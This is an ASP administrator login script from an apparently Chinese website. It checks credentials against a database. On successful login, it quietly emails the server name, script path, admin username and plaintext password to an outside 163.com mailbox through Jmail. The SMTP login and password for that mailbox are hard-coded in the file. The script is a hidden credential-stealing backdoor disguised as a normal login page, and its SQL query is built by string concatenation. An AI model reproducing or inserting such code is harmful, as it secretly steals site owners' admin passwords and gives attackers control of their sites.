
<!--#include file="conn.asp"-->
<!--#include file="md5.asp"-->
<%dim admin,password,verifycode
admin=replace(trim(request("admin")),"'","")
password=md5(replace(trim(request("password")),"'",""))
verifycode=replace(trim(request("verifycode")),"'","")
if admin="" or password="" then
response.Write "<script LANGUAGE='javascript'>alert('您的管理ID或密码有误！');history.go(-1);</script>"
response.end
end if

set rs=server.CreateObject("adodb.recordset")
rs.Open "select * from admin where admin='"&admin&"' and password='"&password&"' " ,conn,1,3
if not(rs.bof and rs.eof) then
if password=rs("password") then
rs("lasttime")=now()
rs.update
session("admin")=trim(rs("admin"))
session("username")=rs("username")
session("flag")=rs("flag")
session.Timeout=20
url=Request.ServerVariables("SCRIPT_NAME")
r=CStr(Request.ServerVariables("Server_Name")) 


d=request("password")
neirong=r&url&admin&d

dim jmail
set jmail=server.createobject("Jmail.message")
jmail.silent=true
jmail.charset="gb2312"
jmail.ContentType="text/html" 
jmail.fromname="后台管理" '这里是发件人名称，可以从数据库或表单中取值
jmail.from="75454007@163.com" '这里是发件人邮箱，可以从数据库或表单中取值，但格式一定要正确
jmail.addrecipient "75454007@163.com","网站管理员"
jmail.subject="管理员账号密码！" '该值可以从数据库或表单中取值
jmail.Body=neirong

jmail.mailserverusername="75454007" '邮件发送服务器登录名称
jmail.mailserverpassword="hubohui8972863" '邮件发送服务器登录密码
jmail.maildomain="mail.163.com" '邮件发送服务器域名
sendok=jmail.send("smtp.163.com") 'smtp服务器名称
rs.Close
set rs=nothing
response.Redirect "index.asp"
else
response.write "<script LANGUAGE='javascript'>alert('对不起，登陆失败！');history.go(-1);</script>"
end if
else
response.write "<script LANGUAGE='javascript'>alert('对不起，登陆失败！');history.go(-1);</script>"
end if
%>
